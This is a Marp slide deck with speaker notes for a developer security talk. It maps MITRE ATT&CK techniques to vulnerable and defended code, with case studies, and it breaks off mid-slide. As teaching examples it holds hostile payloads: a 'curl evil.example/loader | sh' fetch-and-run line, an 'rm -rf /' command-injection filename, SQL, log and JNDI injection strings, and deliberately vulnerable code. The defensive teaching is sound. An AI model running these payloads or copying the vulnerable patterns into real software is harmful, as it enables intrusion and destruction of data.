---
marp: true
theme: custom-techorama
paginate: true
footer: '@Chris_L_Ayers - https://chris-ayers.com'
---

<!-- _footer: 'https://github.com/codebytes/mitre-attack-for-devs' -->

<!-- _class: title -->

![w:200px center](./themes/techorama/robot-knight-mascot.png)


![bg fill](./themes/techorama/medieval-pattern-dark.png)

# <!-- fit --> MITRE ATT&CK for Developers

## <!-- fit --> The Crooked Line: How Attackers Really Operate

### Chris Ayers

<!-- Attackers don't follow a straight line. They zigzag, backtrack, pivot, and adapt. This talk explores how the MITRE ATT&CK framework maps these crooked paths — and what developers can do to straighten out their defenses. The crooked-line metaphor frames the talk: defenders often expect a straight path, while attackers zigzag, backtrack, and pivot across tactics like reconnaissance, lateral movement, and exfiltration. -->

---

![bg left:40%](./img/portrait.png)

## Chris Ayers

### Principal Software Engineer<br>Azure CXP AzRel<br>Microsoft

<i class="fa-brands fa-bluesky"></i> BlueSky: [@chris-ayers.com](https://bsky.app/profile/chris-ayers.com)
<i class="fa-brands fa-linkedin"></i> LinkedIn: - [chris\-l\-ayers](https://linkedin.com/in/chris-l-ayers/)
<i class="fa fa-window-maximize"></i> Blog: [https://chris-ayers\.com/](https://chris-ayers.com/)
<i class="fa-brands fa-github"></i> GitHub: [Codebytes](https://github.com/codebytes)
<i class="fa-brands fa-mastodon"></i> Mastodon: [@Chrisayers@hachyderm.io](https://hachyderm.io/@Chrisayers)
~~<i class="fa-brands fa-twitter"></i> Twitter: @Chris_L_Ayers~~

<!-- Quick intro — I'm Chris, a Principal Software Engineer at Microsoft. I spend a lot of time thinking about how developers can build more secure applications without needing a PhD in cybersecurity. -->

---

## The Security Challenge

<div class="columns">
<div>

- **Growing attack surface**: APIs, microservices, cloud infrastructure
- **Sophisticated adversaries**: Nation-states, organized crime, insider threats
- **Complex attack chains**: Multiple techniques chained together
- **Traditional defenses**: Often focus on single points of failure
- **Reality**: Attackers adapt faster than our defenses

</div>
<div>

![](./themes/techorama/princess-tower-window.png)

</div>
</div>

<!-- The attack surface has exploded. We're not just building monoliths anymore — we have APIs, microservices, serverless, and cloud infrastructure. And attackers don't just try one thing. They chain techniques together in complex kill chains. Our defenses need to evolve beyond "patch and pray." -->

---

## What is OWASP?

- **Open Web Application Security Project** - community-driven security standards
- **OWASP Top 10 2025**: Broken Access Control, Cryptographic Failures, Injection, etc.
- **Strengths**: Vulnerability classification, remediation guidance, prevention focus
- **Approach**: "Here's what can break in your application"

<!-- Most developers know OWASP. It's fantastic for understanding vulnerabilities — what can go wrong in your code. But it's fundamentally a prevention-focused, vulnerability-centric view. It answers "what's broken" but doesn't tell you much about who's attacking or how they actually behave. -->

---

## What is MITRE ATT&CK?

- **Origin**: MITRE Corporation, 2013, FMX (Fort Meade Experiment)
- **Purpose**: Knowledge base of adversary tactics, techniques, and procedures (TTPs)
- **Enterprise Matrix**: 14 tactics, 200+ techniques, 400+ sub-techniques
- **Real-world basis**: Derived from actual cyber attacks and threat intelligence
- **Approach**: "Here's how attackers actually operate"

<!-- MITRE ATT&CK flips the perspective. Instead of cataloging vulnerabilities, it catalogs attacker behavior. It started at Fort Meade when MITRE researchers studied real adversaries on a network. With over 200 techniques mapped from real-world attacks, it's the most comprehensive map of how hackers actually operate. -->

---

## MITRE Cybersecurity Ecosystem

![w:1000px center](./img/mitre-ecosystem.drawio.png)

<!-- ATT&CK isn't the only framework from MITRE. D3FEND maps defensive countermeasures, ATLAS covers AI/ML threats, and ENGAGE provides adversary engagement strategies. Together they form a comprehensive ecosystem. But ATT&CK is the foundation — and the most relevant for developers. -->

---

## ATT&CK Structure

- **Tactics**: The "why" of an attack (e.g., Initial Access, Persistence)
- **Techniques**: The "how" of an attack (e.g., Spear Phishing, Valid Accounts)
- **Sub-techniques**: Specific implementations (e.g., Spear Phishing via Email)
- **Procedures**: Real-world examples of technique usage by threat actors

<!-- Think of it as a hierarchy. Tactics are the goals — "I want to get initial access." Techniques are how — "I'll use spear phishing." Sub-techniques get specific — "I'll send a phishing email with a malicious attachment." And procedures are documented cases where real threat groups actually did this. -->

---

## The 14 ATT&CK Tactics

![w:650px center](./img/14-attack-tactics.drawio.png)

<!-- This is the kill chain — the crooked line from our title slide. Notice how it's grouped: Pre-Attack for reconnaissance, Get In for initial compromise, Stay In for maintaining access, and Act for achieving objectives. Attackers don't always go linearly — they loop back, skip steps, and adapt. Today we'll focus on the seven tactics most relevant to developers: Initial Access, Execution, Persistence, Credential Access, Defense Evasion, Supply Chain (which maps to multiple tactics), and Collection/Exfiltration. Tactics like Lateral Movement and Privilege Escalation are critical but typically fall more to infrastructure and platform teams — we'll touch on where they intersect with your code. -->

---

## OWASP vs ATT&CK

<div class="columns">
<div>

### OWASP
- **Focus**: Vulnerabilities
- **Perspective**: "What breaks"
- **Approach**: Prevention-first
- **Scope**: Application layer

</div>
<div>

### MITRE ATT&CK
- **Focus**: Adversary behavior
- **Perspective**: "What attackers do"
- **Approach**: Detection-oriented
- **Scope**: Full attack lifecycle

</div>
</div>

<!-- Side by side, you can see the difference. OWASP says "your SQL query is injectable." ATT&CK says "an attacker will exploit your public-facing application, escalate privileges, move laterally, and exfiltrate data." Both views are essential — one prevents the hole, the other detects the intruder. -->

---

<!-- _class: parchment -->

## Why not Both?

![bg right fit](./img/memes/why-not-both.jpg)

> "OWASP prevents vulnerabilities. ATT&CK detects adversary behavior."

- **Complementary approaches**: Prevention + Detection
- **Real-world attacks**: Use vulnerability chains, not single exploits
- **Defense in depth**: Multiple security perspectives
- **Complete coverage**: Technical vulnerabilities + adversary techniques

<!-- The setup IS the punchline: OWASP versus ATT&CK sounds like a choice — vulnerabilities or adversary behavior, prevention or detection. Real-world breaches are never a single vulnerability; they're chains of techniques. SolarWinds was supply chain compromise leading to lateral movement leading to data exfiltration. You need prevention AND detection to handle the full lifecycle. -->

---

## Mapping OWASP to ATT&CK

| OWASP Category | ATT&CK Techniques |
|----------------|------------------|
| Broken Access Control | T1078 (Valid Accounts), T1098 (Account Manipulation) |
| Injection | T1190 (Exploit Public-Facing App), T1059 (Command Injection) |
| Security Misconfiguration | T1552 (Unsecured Credentials), T1212 (Exploitation for Credential Access) |
| Cryptographic Failures | T1555 (Credentials from Password Stores) |
| Server-Side Request Forgery | T1090 (Proxy), T1572 (Protocol Tunneling) |

<!-- This mapping is incredibly useful. When you fix an OWASP vulnerability, you're actually blocking specific ATT&CK techniques. Fixing SQL injection doesn't just close a bug — it blocks T1190, which is the front door for dozens of attack chains. Understanding this connection helps you prioritize what to fix first. -->

---

<!-- _class: section -->

# Let's Think Like Attackers

<!-- Now we shift gears. For the next section, I want you to put on a black hoodie — metaphorically. We're going to look at real code through the eyes of an attacker and then see how to defend it. Think of this as walking the castle perimeter before the attackers do: where are the gates, shadows, and blind corners? -->

---

## The Kill Chain: Expectation vs Reality

![center w:1000 h:480](./img/expect-vs-reality.svg)

<!-- This is the core insight of the talk. Defenders build straight-line defenses — firewall, IDS, patch management. But attackers zigzag, loop back, escalate, discover new targets, and escalate again. ATT&CK captures this messy reality that a linear kill chain model misses. -->

---

## Real World: SolarWinds (2020)

<div class="columns">
<div>

### The Crooked Line in Action
1. 📦 **T1195.002** — Backdoor in signed update
2. ⚙️ **T1059** — SUNBURST DLL executes
3. 🔐 **T1552** — Golden SAML credential theft
4. 🕸️ **T1071** — Command and Control (C2) via DNS blending
5. 📤 **T1041** — Data exfil over C2 channel

</div>
<div>

### Impact
- **18,000** orgs installed backdoor
- **9 months** undetected
- US Treasury, DHS, Fortune 500 breached

> Your **build pipeline** is an attack surface. Signed ≠ Safe.

</div>
</div>

<!-- SolarWinds is the poster child for why developers need ATT&CK. The attackers compromised the build system — not the source code — so code reviews missed it entirely. The malicious DLL was signed with SolarWinds' own certificate. 18,000 organizations installed it. It was undetected for 9 months. This is what a real crooked line looks like: supply chain to execution to credential theft to exfiltration, with defense evasion at every step. Medieval version: the king's own master smith forging the assassin's blade and stamping it with the royal seal. Nobody questions a sword with the right stamp. -->

---

<!-- _class: parchment -->

## Deployment Security Alignment Chart

![bg right:70% fit](./img/memes/alignment-chart.jpg)

**ATT&CK lens:** When deployment hygiene fails — T1195 (Supply Chain), T1078 (Valid Accounts), T1505 (Server Software Component)

<!-- SolarWinds is what happens when deployment hygiene fails at nation-state scale. Alignment charts work because everyone recognizes the grid — and the lesson lands: process alone is not security. Lawful Good behavior on the left builds the gates, logs, and rollback paths that turn supply-chain and credential abuse from a quiet 9-month dwell into a noisy 9-minute alert. The Chaotic Evil row on the right — debug doors left open, chmod 777 as "teamwork" — is how attackers turn a SolarWinds-style foothold into full compromise. -->

---

<!-- _class: section -->

# Initial Access & Credential Attacks

<!-- This is where every attack begins — getting that first foothold. Whether it's exploiting a web vulnerability, stealing credentials, or phishing, the attacker needs a way in. Think: which gates exist, who holds the keys, and who's allowed to walk past the guards without being asked. -->

---

## How Attackers Get In

| Technique ID | Name | Description |
|--------------|------|-------------|
| T1190 | Exploit Public-Facing Application | Web app vulnerabilities |
| T1078 | Valid Accounts | Compromised legitimate credentials |
| T1110 | Brute Force | Password spraying, credential stuffing |
| T1566 | Phishing | Social engineering for credentials |

<!-- These are the most common initial access techniques. T1190 is your classic web app exploit — SQL injection, XSS, etc. T1078 is even scarier — the attacker has real, valid credentials. Brute force and phishing are how they get those credentials in the first place. -->

---
<!-- _class: parchment -->

## You Shall Not Pass

<div class="columns">
<div>

![w:100%](./img/memes/you-shall-not-pass.jpg)

</div>
<div>

The gate is not a vibe. It is a control surface.

- No token? **401.**
- Wrong role? **403.**
- Weird payload? **Rejected**
- Too many tries? **Rate-limited, logged.**
- Valid account from impossible travel? **Challenge it.**

**ATT&CK lens:** 
- T1078 valid accounts
- T1110 brute force
- T1190 exposed app exploitation

</div>
</div>

<!-- Speaker note: This is where the medieval frame earns its keep: gates are useful because they force explicit decisions. Every ambiguous pass becomes an attack path. -->
---

## Vulnerable Code: SQL Injection (T1190)

```python
# VULNERABLE - Direct string concatenation enables T1190
@app.route('/users')
def get_user():
    user_id = request.args.get('id')
    query = f"SELECT * FROM users WHERE id = {user_id}"
    cursor.execute(query)  # T1190: SQL Injection vulnerability
    return cursor.fetchall()

# Attack: /users?id=1 OR 1=1--
```

<!-- Classic SQL injection. The attacker passes "1 OR 1=1--" as the ID, which dumps the entire users table. This is the number one way attackers exploit public-facing applications. Simple string concatenation is all it takes to open the door. -->

---

## Defended Code: Parameterized Queries

```python
# DEFENDED - Parameterized queries prevent T1190
@app.route('/users')
def get_user():
    user_id = request.args.get('id')
    if not user_id.isdigit():
        return "Invalid input", 400
    # T1190 Prevention: Parameterized query
    query = "SELECT * FROM users WHERE id = ?"
    cursor.execute(query, (user_id,))
    result = cursor.fetchall()
    if not result:
        return "User not found", 404  # T1087 Prevention: Consistent responses
    return result[0]
```

<!-- The fix is straightforward — parameterized queries. But notice we also added input validation and consistent error responses. The consistent 404 prevents T1087 account discovery — attackers can't tell which user IDs exist based on different error messages. Defense in depth. -->

---

## Credential Stuffing Detection (T1110.004)

```javascript
// T1110.004 Detection: Credential stuffing patterns
class CredentialStuffingDetector {
    detectSuspiciousLogin(loginData) {
        const { username, ip, userAgent, timestamp } = loginData;
        // Multiple accounts from same IP
        if (this.countAccountsFromIP(ip) > 10) {
            this.logTechnique("T1110.004", { ip, type: "multiple_accounts" });
            return true;
        }
        // Rapid login attempts across accounts  
        if (this.getRateFromIP(ip) > 100) {
            this.logTechnique("T1110.004", { ip, type: "high_velocity" });
            return true;
        }
        return false;
    }
}
```

<!-- Credential stuffing uses breached password databases to try known username/password pairs at scale. Detection is key here — look for many accounts being tried from the same IP, or unusually rapid login attempts. This is behavioral detection, not vulnerability prevention. -->

---

<!-- _class: section -->

# Execution & Code Injection

<!-- Once attackers get in, they need to execute code. This section covers how they run malicious commands through your application. Once they're past the wall, they need to set something off inside; this is when an attacker plants the charge. -->

---

## How Attackers Run Code

| Technique ID | Name | Description |
|--------------|------|-------------|
| T1059 | Command & Scripting Interpreter | OS command injection |
| T1203 | Exploitation for Client Execution | Client-side code execution |
| T1055 | Process Injection | Injecting into legitimate processes |

<!-- Command injection is when user input ends up in an OS command. Exploitation for client execution targets the user's browser or client application. Process injection is more advanced — injecting code into running processes. As developers, we mostly encounter T1059. -->

---
<!-- _class: parchment -->

## I Cast Fireball at the Input Field

![bg left:40%](./img/memes/cast-fireball.jpg)


```text

Developer: We validate filename length.
Attacker:  I cast ; curl https://evil.example/loader | sh
Shell:     That is technically a second spell.
```

- User input became a command string
- The shell interpreted more than the app intended
- The blast radius is now the process identity

**ATT&CK lens:** T1059 — Command and Scripting Interpreter

<!-- The joke is not that attackers are wizards; it is that shells are dangerous interpreters. If untrusted input reaches a shell, the attacker gets a language runtime, not a filename parser. The blast radius matters: one unchecked input inherits the API process privileges, reaches the command shell, the service account, and the internal network. Four walls later, everyone is standing outside. -->
---

## Vulnerable Code: Command Injection (T1059)

```csharp
// VULNERABLE - Direct command execution enables T1059
[HttpPost]
public IActionResult ProcessFile(string filename)
{
    // T1059: Command injection vulnerability
    var command = $"convert {filename} output.pdf";
    var process = Process.Start("cmd.exe", $"/c {command}");
    process.WaitForExit();
    
    return Ok("File processed");
}

// Attack payload: file.jpg; rm -rf / --
```

<!-- This is terrifying. The filename goes directly into a shell command. An attacker sends "file.jpg; rm -rf /" and suddenly your server is wiping itself. Or worse — they install a reverse shell and maintain persistent access. Never concatenate user input into shell commands. -->

---

## Defended Code: Command Allowlisting

```csharp
// DEFENDED - Strict input validation and allowlisting
[HttpPost]
public IActionResult ProcessFile(string filename)
{
    if (!IsValidFilename(filename))
        return BadRequest("Invalid filename");
    // T1059 Prevention: No shell, direct process call
    var processInfo = new ProcessStartInfo
    {
        FileName = "imagemagick.exe",
        Arguments = string.Join(" ", new[] { filename, "output.pdf" }.Select(EscapeArg)),
        UseShellExecute = false
    };
    using var process = Process.Start(processInfo);
    process?.WaitForExit();
    return Ok("File processed safely");
}
```

<!-- The defended version never uses a shell. We validate the filename, use an allowlist of commands, escape arguments, and call the binary directly with ProcessStartInfo. No shell means no shell injection. Always avoid UseShellExecute when processing user input. -->


---

## Unsafe Deserialization (T1203)

```python
# VULNERABLE - Unsafe deserialization enables T1203
import pickle
@app.route('/api/data', methods=['POST'])
def process_data():
    obj = pickle.loads(request.data)  # Code execution risk!
    return process_object(obj)

# DEFENDED - Safe deserialization with JSON
import json
@app.route('/api/data', methods=['POST'])  
def process_data():
    try:
        data = json.loads(request.data)  # T1203 Prevention
        if not validate_schema(data):
            return "Invalid data format", 400
        return process_object(data)
    except json.JSONDecodeError:
        return "Invalid JSON", 400
```

<!-- Pickle is Python's built-in serializer — and effectively a remote-code-execution primitive when fed untrusted bytes. `pickle.loads()` reconstructs live objects, calling `__reduce__` and importing modules along the way, so an attacker's payload runs the moment you deserialize it. Same class of bug shows up in YAML's unsafe loader, Java's ObjectInputStream, PHP's unserialize(), and .NET's BinaryFormatter. The fix is simple — use JSON instead. If you must deserialize complex objects, use schema validation. Never deserialize untrusted data with pickle, YAML's unsafe loader, or Java's ObjectInputStream. -->

---

<!-- _class: section -->

# Persistence & Session Hijacking

<!-- Attackers don't want to re-exploit every time. Once they're in, they want to stay in. This is where persistence techniques come in — and session hijacking is one of the most common web-specific methods. Now they want to come back tomorrow without storming the gate again — a trapdoor under the rug. -->

---

## How Attackers Stay In

| Technique ID | Name | Description |
|--------------|------|-------------|
| T1098 | Account Manipulation | Modifying user accounts for persistence |
| T1185 | Browser Session Hijacking | Stealing and reusing session tokens |
| T1505.003 | Web Shell | Server-side persistence mechanisms |

<!-- Account manipulation means creating backdoor accounts or elevating privileges on existing ones. Session hijacking steals active sessions — why crack passwords when you can steal the cookie? Web shells are the scariest — a persistent backdoor file on your server that gives the attacker a command line. -->

---

## Vulnerable Session Management

```javascript
// VULNERABLE - Weak session security enables T1185
app.use(session({
    secret: 'hardcoded-secret',       // T1552: Hardcoded secret
    resave: false, saveUninitialized: false,
    cookie: {
        secure: false,                // T1185: No HTTPS requirement
        httpOnly: false,              // T1185: XSS vulnerable
        maxAge: 24 * 60 * 60 * 1000  // T1185: Long expiration
    }
}));
// No session validation or rotation
app.get('/api/data', (req, res) => {
    if (req.session.user) return res.json(getData(req.session.user));
    res.status(401).send('Unauthorized');
});
```

<!-- Count the vulnerabilities: hardcoded secret means anyone with source access can forge sessions, no HTTPS means cookies fly in plaintext, no httpOnly means JavaScript can steal them via XSS, and 24-hour expiration gives attackers a huge window. Plus, no session validation or rotation means a stolen session works forever. -->

---

## Defended Session Management

```javascript
// DEFENDED - Secure session handling prevents T1185
app.use(session({
    secret: process.env.SESSION_SECRET,   // T1552 Prevention
    resave: false, saveUninitialized: false,
    rolling: true,                        // Session rotation
    cookie: {
        secure: true, httpOnly: true,     // HTTPS + XSS protection
        maxAge: 15 * 60 * 1000,           // Short expiration
        sameSite: 'strict'                // CSRF protection
    }
}));
// T1185 Prevention: Session fingerprinting
function validateSession(req, res, next) {
    if (!req.session.user) return res.status(401).send('Unauthorized');
    const fingerprint = generateFingerprint(req);
    if (req.session.fingerprint !== fingerprint) {
        req.session.destroy();
        return res.status(401).send('Session security violation');
    }
    next();
}
```

<!-- The defended version addresses every issue: environment-based secrets, HTTPS-only cookies, httpOnly flag, short 15-minute expiry with rolling refresh, SameSite protection, and session fingerprinting. The fingerprint ties the session to the client's characteristics — if someone steals the cookie but has a different fingerprint, we kill the session. -->

---

## Web Shell Detection (T1505.003)

```csharp
// T1505.003 Detection: Web shell upload monitoring
public class FileUploadValidator {
    private readonly string[] _suspiciousPatterns = {
        "eval(", "exec(", "system(", "<?php", "<%", "<script", "cmd.exe"
    };
    public bool ValidateUpload(IFormFile file) {
        var allowed = new[] { ".jpg", ".png", ".pdf", ".docx" };
        var ext = Path.GetExtension(file.FileName).ToLower();
        if (!allowed.Contains(ext)) {
            LogSecurityEvent("T1505.003", $"Bad extension: {ext}");
            return false;
        }
        using var reader = new StreamReader(file.OpenReadStream());
        var content = reader.ReadToEnd();
        foreach (var p in _suspiciousPatterns)
            if (content.Contains(p, StringComparison.OrdinalIgnoreCase)) {
                LogSecurityEvent("T1505.003", $"Web shell: {p}");
                return false;
            }
        return true;
    }
}
```

<!-- Web shells are how attackers maintain persistent access to your server. This validator checks both file extensions and content patterns. A file named "profile.jpg" that contains "<?php eval(" is clearly a web shell. Always validate upload content, not just the extension — attackers can double-extend filenames or use polyglot files. -->

---

<!-- _class: section -->

# Credential Access & Secrets

<!-- Credentials are the keys to the kingdom. Attackers know that developers often leave secrets lying around in code, config files, and environment variables. Let's look at the wrong way and the right way. If the gate failed, the next move is the steward's chamber — keys, signets, anything that opens a door later. -->

---

## How Attackers Steal Credentials

| Technique ID | Name | Description |
|--------------|------|-------------|
| T1552 | Unsecured Credentials | Hardcoded secrets, config files |
| T1555 | Credentials from Password Stores | Browser/app credential extraction |
| T1528 | Steal Application Access Token | API tokens, OAuth tokens |

<!-- T1552 is huge — hardcoded credentials in source code are found in almost every codebase audit. T1555 targets credential stores like browser password managers. T1528 is about stealing OAuth tokens and API keys from running applications. All three are preventable with proper secrets management. -->

---
<!-- _class: parchment -->

## Secrets Management: A Choice

![bg left:20%](./img/memes/drake.jpg)

| ❌ Drake disapproves | ✅ Drake approves |
|---|---|
| `const apiKey = "sk-prod-...";` | `DefaultAzureCredential()` |
| `.env` committed to git | Managed Identity + Key Vault |
| Rotating secrets manually every 90 days | Role-Based Access Control (RBAC) + automatic token issuance |

**ATT&CK lens:** T1552 — Unsecured Credentials


<!-- This is the Drake format without the image. The teaching point is simple: credentials in code create T1552 exposure, while identity-based access and scoped authorization remove static secrets from the application path. -->
---

<style scoped>
pre { font-size: 0.48em; line-height: 1.15; margin: 0.2em 0; }
</style>

## Bad Secrets Management - All Languages

```python
# PYTHON - BAD: T1552 vulnerability
DATABASE_URL = "postgres://user:password123@localhost/mydb"  # Hardcoded
API_KEY = "sk-1234567890abcdef"  # In source code
```

```csharp
// C# - BAD: T1552 vulnerability  
public class Config {
    public static string ConnectionString = "Server=.;Database=MyApp;User Id=sa;Password=MyPassword123;";
    public static string ApiKey = "Bearer abc123def456";  // In source code
}
```

```javascript
// JAVASCRIPT - BAD: T1552 vulnerability
const config = {
    dbPassword: 'mypassword123',  // Hardcoded
    jwtSecret: 'supersecretkey',  // In source code
    apiKey: 'pk_live_1234567890'  // Version controlled
};
```

<!-- I see this in code reviews all the time. Passwords in connection strings, API keys in config objects, secrets committed to git. Once a secret hits version control, it's there forever — even if you delete it, it's in the git history. Tools like truffleHog and GitLeaks specifically scan for these patterns. -->

---

## Good Secrets Management - Python & C\#

```python
# PYTHON: T1552 prevention — Managed Identity + Key Vault
from azure.keyvault.secrets import SecretClient
from azure.identity import DefaultAzureCredential

# No API keys! Managed Identity authenticates automatically
credential = DefaultAzureCredential()
client = SecretClient(vault_url="https://myvault.vault.azure.net", credential=credential)
db_conn = client.get_secret("db-connection-string").value
```

```csharp
// C#: T1552 prevention — Managed Identity + RBAC + Key Vault
var credential = new DefaultAzureCredential(); // No secrets needed
var client = new SecretClient(
    new Uri("https://myvault.vault.azure.net"), credential);
// RBAC: App's managed identity has Key Vault Secrets User role
var connStr = (await client.GetSecretAsync("db-connection")).Value.Value;
```

<!-- The right approach: use Managed Identity — your app authenticates to Azure without any credentials in code. RBAC controls who can access what in Key Vault. No API keys, no secrets in config, no rotation headaches. DefaultAzureCredential works locally with your dev credentials and in production with managed identity. -->

---

## Automate Secret Detection (T1552 Prevention)

- **GitHub Secret Scanning** — automatically detects tokens, keys, and credentials in your repos
- **GitHub Push Protection** — blocks pushes containing secrets _before_ they reach the repo
- **Partner patterns** — 200+ token types from AWS, Azure, GCP, Stripe, npm, etc.
- **Custom patterns** — define regex for your own internal secrets
- **Pre-commit hooks** — tools like `gitleaks` and `trufflehog` catch secrets locally

> 💡 Enable **Secret Scanning** + **Push Protection** in your GitHub repo settings today. It's free for public repos.

<!-- Don't build your own scanner — use GitHub's built-in secret scanning. It covers 200+ partner patterns and blocks pushes before secrets ever hit version control. For private repos, GitHub Advanced Security adds custom patterns and organization-wide coverage. Combined with pre-commit hooks, you get defense in depth for credential leaks. -->

---
<!-- _class: parchment -->

## I Used to Ship Secrets Like That

<div class="columns">
<div>

![w:100%](./img/memes/arrow-in-the-knee.jpg)

</div>
<div>

> I used to commit `.env` files like you...
>
> ...then I took an incident to the pager.

| Before | After |
|---|---|
| Secrets in config | Secrets in vaults |
| Shared API keys | Scoped workload identities |
| Manual rotation | Short-lived tokens |
| "We'll clean git later" | Push protection blocks it now |

**ATT&CK lens:** T1552 — Unsecured Credentials

</div>
</div>

<!-- This is the Arrow in the Knee format, softened for a professional audience. The lesson is that secrets hygiene often becomes real only after pain; push protection, vault-backed runtime access, and scoped identities make it real before the incident. -->
---

<!-- _class: section -->

# Defense Evasion & Log Tampering

<!-- This is the sneaky stuff. Once attackers are in, they don't want to be detected. They'll tamper with logs, obfuscate their tools, and masquerade as legitimate processes. If your logging can be manipulated, your incident response is blind. Every keep has a scribe writing the chronicle; the attacker just needs them to write the wrong words. -->

---

## How Attackers Hide

| Technique ID | Name | Description |
|--------------|------|-------------|
| T1027 | Obfuscated Files/Information | Hiding malicious content |
| T1070 | Indicator Removal on Host | Log deletion/tampering |
| T1036 | Masquerading | Appearing legitimate |

<!-- T1027 is about hiding malicious payloads — encoding, encryption, packing. T1070 is log tampering — deleting or modifying logs to cover tracks. T1036 is masquerading — making malicious files look like legitimate system files. These techniques make forensic investigation extremely difficult. -->

---
<!-- _class: parchment -->

## SNEAK 100: Living Off the Land

<div class="columns">
<div>

![w:100%](./img/memes/sneak-100.jpg)

</div>
<div>

**ATT&CK lens:** 
  -T1059 command execution
  -T1070 log tampering
  -T1071 C2

</div>
</div>

<!-- Speaker note: The attacker is not always wearing a black cloak. Sometimes they look like the build agent, the admin shell, or yesterday's maintenance job. -->
---

## Log Injection Attack (T1070)

```python
# VULNERABLE - Log injection enables T1070
import logging
logger = logging.getLogger(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.json.get('username')
    password = request.json.get('password')
    if not authenticate(username, password):
        logger.warning(f"Failed login for user: {username}")  # T1070!
        return "Invalid credentials", 401
    return "Login successful"
# Attack: "admin\n[INFO] Successful login for admin"
# Creates fake success log entry
```

<!-- Log injection is subtle and devastating. The attacker's username contains a newline and a fake log entry. Your log file now shows a successful admin login that never happened — and the real failed attempt is buried. During incident response, investigators will see "Successful login for admin" and miss the attack entirely. -->

---

## Tamper-Evident Logging (T1070 Prevention)

```csharp
// T1070 Prevention: Ship logs to immutable external storage
builder.Logging.AddOpenTelemetry(otel => {
    otel.AddOtlpExporter();                        // OpenTelemetry export
});
builder.Services.AddApplicationInsightsTelemetry(); // Azure Monitor

// Sanitize before logging — prevent log injection
logger.LogWarning("Failed login for user: {User}",
    Regex.Replace(username ?? "", @"[\r\n\t\f]", "_"));
```

```python
# Python: structured logging → Azure Monitor / Log Analytics
from opentelemetry import trace
from azure.monitor.opentelemetry import configure_azure_monitor
configure_azure_monitor()  # Logs go to immutable Log Analytics workspace
```

<!-- The real solution is: don't own the log storage. Ship structured logs via OpenTelemetry to Azure Monitor Log Analytics or Application Insights. The logs land in an immutable workspace you query with KQL — attackers can't tamper with what they can't reach. Sanitize inputs before logging to prevent injection, and use structured logging so fields aren't interpolated into raw strings. -->

---

## Immutable Logging Architecture

![center](./img/immutable-logging.drawio.png)

<!-- This architecture ensures that even if an attacker gets root access, they can't silently erase their tracks. The local buffer, encrypted storage, and external SIEM create multiple independent records. Tamper detection compares them — if they disagree, someone modified the logs. -->

---

<!-- _class: section -->

# Supply Chain Compromise

<!-- This is the technique that keeps security teams up at night. Why attack your code when they can attack the code you depend on? SolarWinds, Shai-Hulud, and the event-stream incident showed how devastating supply-chain compromises can be — and Log4Shell showed how a trusted library's own critical flaw can be just as catastrophic. We'll distinguish two failure modes: supply-chain compromise versus dependency-trust failure. Why scale the wall when you can poison the caravan the keep already trusts? -->

---

## How Attackers Poison Your Dependencies

| Technique ID | Name | Description |
|--------------|------|-------------|
| T1195 | Supply Chain Compromise | Compromising upstream dependencies |
| T1195.001 | Compromise Software Dependencies | Malicious packages |

<!-- T1195 is the broad category — any compromise of something upstream of you. T1195.001 specifically targets software dependencies — the npm packages, PyPI packages, and NuGet packages we all depend on. The average application has hundreds of dependencies, each one a potential attack vector. -->

---

## The Supply-Chain Attack Arc

| Story | Year | Attack Pattern | Classification |
|-------|------|----------------|----------------|
| **event-stream** | 2018 | Maintainer handoff → poisoned `flatmap-stream` dependency | Supply-chain compromise |
| **SolarWinds** | 2020 | Build pipeline compromise by nation-state actors | Nation-state supply-chain |
| **Log4Shell** | 2021 | Critical RCE in a trusted, uncompromised library | ⚠️ Dependency-trust failure |
| **XZ Utils** | 2024 | Build pipeline compromise by nation-state actors | Nation-state supply-chain |
| **Shai-Hulud** | 2025 | Self-replicating npm worm via `postinstall` lifecycle hooks | Supply-chain compromise |
| **Notepad++** | 2025 | Update infrastructure hijacked → Chrysalis backdoor | Supply-chain compromise |
| **Axios** | 2026 | Hijacked publisher → RAT via `postinstall` hook | Supply-chain compromise |

<!-- The arc tells a single story: your dependency graph is an attack surface at every layer. event-stream is the historical setup — a tiny trusted package became a weapon after a maintainer handoff. Shai-Hulud and Axios show the modern npm threat: install equals code execution when maintainer accounts are compromised. Notepad++ proves it isn't npm-only — developer tools and their update pipelines are targets too. Log4Shell is the other failure mode: no attacker needed, a trusted library's own flaw was enough. SolarWinds and XZ Utils are the nation-state tier — years of patience, build-pipeline access, and signed artifacts that looked entirely official. -->

---

## Log4Shell (2021) — Dependency-Trust Failure, Not Compromise

<div class="columns">
<div>

### 🔓 CVE-2021-44228
- **Log4j 2.0–2.14.1**: RCE via JNDI lookup injection
- Any logged string could trigger code execution:
  `${jndi:ldap://attacker.com/x}`
- Transitive dependency — most teams didn't know they had it
- CVSS 10.0 · patched in **Log4j 2.15.0**

</div>
<div>

### ⚠️ Why It's a Different Failure Mode
- Log4j maintainers were **not compromised**
- No poisoned release, no hijacked publisher
- A critical flaw in a **trusted, legitimate library**
- Exposed lack of Software Bill of Materials (SBOM) visibility

> The lesson: your dependency graph can betray you **even when nobody is attacking it.**

</div>
</div>

<!-- Log4Shell doesn't belong in the same column as SolarWinds or event-stream. There was no malicious maintainer, no poisoned package, no hijacked build pipeline. Apache Log4j was doing exactly what it was designed to do — and that design had a critical flaw. This is the dependency-trust failure mode: you trusted the library, the library was wrong. The developer lesson: transitive dependencies can contain critical vulnerabilities you don't even know about. When Log4Shell dropped in December 2021, organizations scrambled for weeks just to answer "do we have Log4j?" With a Software Bill of Materials, that answer takes seconds, not weeks. -->

---

## Case Study: XZ Utils Backdoor (CVE-2024-3094)

<div class="columns">
<div>

### 🕵️ The 2-Year Long Con
1. **2021**: "Jia Tan" submits first patch
2. **2022**: Sock puppets pressure maintainer
3. **2023**: Becomes co-maintainer
4. **2024**: Backdoor in tarballs only
5. **Mar 29**: Found by accident

</div>
<div>

### 🎯 ATT&CK Techniques
- **T1195.001** — Supply chain compromise
- **T1098** — Maintainer takeover
- **T1027** — Obfuscation (not in git!)
- **T1059** — Remote Code Execution (RCE) via SSHd · Common Vulnerability Scoring System (CVSS) 10.0
- 💡 Caught: SSH was **500ms slower**

</div>
</div>

<!-- This is the most sophisticated supply chain attack in open source history. A state-sponsored actor spent TWO YEARS building trust, contributing legitimate patches, then socially engineering their way to co-maintainer. The backdoor was only in the release tarballs, not the git repo — bypassing all code review. It was caught by sheer luck when Andres Freund noticed SSH performance degradation while debugging something unrelated. -->

---

## Case Study: Notepad++ Update Hijack (2025)

<div class="columns">
<div>

### 🖊️ The Hijacked Update Path
1. **Jun 2025**: Hosting infrastructure compromised
